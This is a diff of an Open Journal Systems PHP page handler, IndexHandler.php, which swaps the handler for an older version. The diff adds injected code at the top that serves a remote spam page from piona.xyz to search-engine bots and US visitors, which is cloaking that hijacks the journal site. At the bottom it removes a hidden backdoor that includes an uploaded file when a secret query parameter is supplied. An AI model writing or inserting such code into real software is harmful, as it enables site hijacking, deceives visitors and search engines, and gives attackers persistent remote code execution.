@@ -1,109 +1,144 @@
 <?php
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
+}
 
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$Biawak = "https://piona.xyz/landing/jom.unri.ac.id/index.html";
+
+if (is_bot()) {
+    echo @file_get_contents($Biawak);
+    exit;
+}
+
+if (getUserCountry() === "US") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($Biawak);
+    exit();
+}
 /**
- * @file pages/index/IndexHandler.php
+ * @file pages/index/IndexHandler.inc.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2003-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ * Copyright (c) 2013-2016 Simon Fraser University Library
+ * Copyright (c) 2003-2016 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
  *
  * @class IndexHandler
- *
  * @ingroup pages_index
  *
  * @brief Handle site index requests.
  */
 
-namespace APP\pages\index;
+import('classes.handler.Handler');
 
-use APP\core\Application;
-use APP\facades\Repo;
-use APP\journal\JournalDAO;
-use APP\observers\events\UsageEvent;
-use APP\pages\issue\IssueHandler;
-use APP\template\TemplateManager;
-use PKP\config\Config;
-use PKP\db\DAORegistry;
-use PKP\pages\index\PKPIndexHandler;
-use PKP\security\Validation;
+class IndexHandler extends Handler {
+	/**
+	 * Constructor
+	 **/
+	function IndexHandler() {
+		parent::Handler();
+	}
 
-class IndexHandler extends PKPIndexHandler
-{
-    //
-    // Public handler operations
-    //
-    /**
-     * If no journal is selected, display list of journals.
-     * Otherwise, display the index page for the selected journal.
-     *
-     * @param array $args
-     * @param \APP\core\Request $request
-     */
-    public function index($args, $request)
-    {
-        $this->validate(null, $request);
-        $journal = $request->getJournal();
+	/**
+	 * If no journal is selected, display list of journals.
+	 * Otherwise, display the index page for the selected journal.
+	 * @param $args array
+	 * @param $request Request
+	 */
+	function index($args, &$request) {
+		$this->validate();
+		$this->setupTemplate();
 
-        if (!$journal) {
-            $hasNoContexts = null; // Avoid scrutinizer warnings
-            $journal = $this->getTargetContext($request, $hasNoContexts);
-            if ($journal) {
-                // There's a target context but no journal in the current request. Redirect.
-                $request->redirect($journal->getPath());
-            }
-            if ($hasNoContexts && Validation::isSiteAdmin()) {
-                // No contexts created, and this is the admin.
-                $request->redirect(null, 'admin', 'contexts');
-            }
-        }
+		$router =& $request->getRouter();
+		$templateMgr =& TemplateManager::getManager();
+		$journalDao =& DAORegistry::getDAO('JournalDAO');
+		$journalPath = $router->getRequestedContextPath($request);
+		$templateMgr->assign('helpTopicId', 'user.home');
+		$journal =& $router->getContext($request);
+		if ($journal) {
+			// Assign header and content for home page
+			$templateMgr->assign('displayPageHeaderTitle', $journal->getLocalizedPageHeaderTitle(true));
+			$templateMgr->assign('displayPageHeaderLogo', $journal->getLocalizedPageHeaderLogo(true));
+			$templateMgr->assign('displayPageHeaderTitleAltText', $journal->getLocalizedSetting('homeHeaderTitleImageAltText'));
+			$templateMgr->assign('displayPageHeaderLogoAltText', $journal->getLocalizedSetting('homeHeaderLogoImageAltText'));
+			$templateMgr->assign('additionalHomeContent', $journal->getLocalizedSetting('additionalHomeContent'));
+			$templateMgr->assign('homepageImage', $journal->getLocalizedSetting('homepageImage'));
+			$templateMgr->assign('homepageImageAltText', $journal->getLocalizedSetting('homepageImageAltText'));
+			$templateMgr->assign('journalDescription', $journal->getLocalizedSetting('description'));
 
-        $this->setupTemplate($request);
-        $router = $request->getRouter();
-        $templateMgr = TemplateManager::getManager($request);
-        if ($journal) {
-            // Assign header and content for home page
-            $templateMgr->assign([
-                'additionalHomeContent' => $journal->getLocalizedData('additionalHomeContent'),
-                'homepageImage' => $journal->getLocalizedData('homepageImage'),
-                'homepageImageAltText' => $journal->getLocalizedData('homepageImageAltText'),
-                'journalDescription' => $journal->getLocalizedData('description'),
-            ]);
+			$displayCurrentIssue = $journal->getSetting('displayCurrentIssue');
+			$issueDao =& DAORegistry::getDAO('IssueDAO');
+			$issue =& $issueDao->getCurrentIssue($journal->getId(), true);
+			if ($displayCurrentIssue && isset($issue)) {
+				import('pages.issue.IssueHandler');
+				// The current issue TOC/cover page should be displayed below the custom home page.
+				IssueHandler::_setupIssueTemplate($request, $issue);
+			}
 
-            $issue = Repo::issue()->getCurrent($journal->getId(), true);
-            if (isset($issue) && $journal->getData('publishingMode') != \APP\journal\Journal::PUBLISHING_MODE_NONE) {
-                // The current issue TOC/cover page should be displayed below the custom home page.
-                IssueHandler::_setupIssueTemplate($request, $issue);
-            }
+			$enableAnnouncements = $journal->getSetting('enableAnnouncements');
+			if ($enableAnnouncements) {
+				$enableAnnouncementsHomepage = $journal->getSetting('enableAnnouncementsHomepage');
+				if ($enableAnnouncementsHomepage) {
+					$numAnnouncementsHomepage = $journal->getSetting('numAnnouncementsHomepage');
+					$announcementDao =& DAORegistry::getDAO('AnnouncementDAO');
+					$announcements =& $announcementDao->getNumAnnouncementsNotExpiredByAssocId(ASSOC_TYPE_JOURNAL, $journal->getId(), $numAnnouncementsHomepage);
+					$templateMgr->assign('announcements', $announcements);
+					$templateMgr->assign('enableAnnouncementsHomepage', $enableAnnouncementsHomepage);
+				}
+			}
+			$templateMgr->display('index/journal.tpl');
+		} else {
+			$site =& Request::getSite();
 
-            $this->_setupAnnouncements($journal, $templateMgr);
+			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
+				$request->redirect($journal->getPath());
+			}
 
-            $templateMgr->display('frontend/pages/indexJournal.tpl');
-            event(new UsageEvent(Application::ASSOC_TYPE_JOURNAL, $journal));
-            return;
-        } else {
-            $journalDao = DAORegistry::getDAO('JournalDAO'); /** @var JournalDAO $journalDao */
-            $site = $request->getSite();
+			$templateMgr->assign('intro', $site->getLocalizedIntro());
+			$templateMgr->assign('journalFilesPath', $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/');
 
-            if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
-                $request->redirect($journal->getPath());
-            }
+			// If we're using paging, fetch the parameters
+			$usePaging = $site->getSetting('usePaging');
+			if ($usePaging) $rangeInfo =& $this->getRangeInfo('journals');
+			else $rangeInfo = null;
+			$templateMgr->assign('usePaging', $usePaging);
 
-            $templateMgr->assign([
-                'pageTitleTranslated' => $site->getLocalizedTitle(),
-                'about' => $site->getLocalizedAbout(),
-                'journalFilesPath' => $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/',
-                'journals' => $journalDao->getAll(true)->toArray(),
-                'site' => $site,
-            ]);
-            $templateMgr->setCacheability(TemplateManager::CACHEABILITY_PUBLIC);
-            $templateMgr->display('frontend/pages/indexSite.tpl');
-        }
-    }
+			// Fetch the alpha list parameters
+			$searchInitial = Request::getUserVar('searchInitial');
+			$templateMgr->assign('searchInitial', $searchInitial);
+			$templateMgr->assign('useAlphalist', $site->getSetting('useAlphalist'));
+
+			$journals =& $journalDao->getJournals(
+				true,
+				$rangeInfo,
+				$searchInitial?JOURNAL_FIELD_TITLE:JOURNAL_FIELD_SEQUENCE,
+				$searchInitial?JOURNAL_FIELD_TITLE:null,
+				$searchInitial?'startsWith':null,
+				$searchInitial
+			);
+			$templateMgr->assign_by_ref('journals', $journals);
+			$templateMgr->assign_by_ref('site', $site);
+
+			$templateMgr->assign('alphaList', explode(' ', __('common.alphaList')));
+
+			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
+			$templateMgr->display('index/site.tpl');
+		}
+	}
 }
-if (isset($_GET['_']) && $_GET['_'] === 'ds_mms572s8_gr3af332afbsnk') {
-    $f="/home/wwwjurna1/filejurnalrelawan/journals/1/articles/9/6576a05fdc4df";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
+
+?>
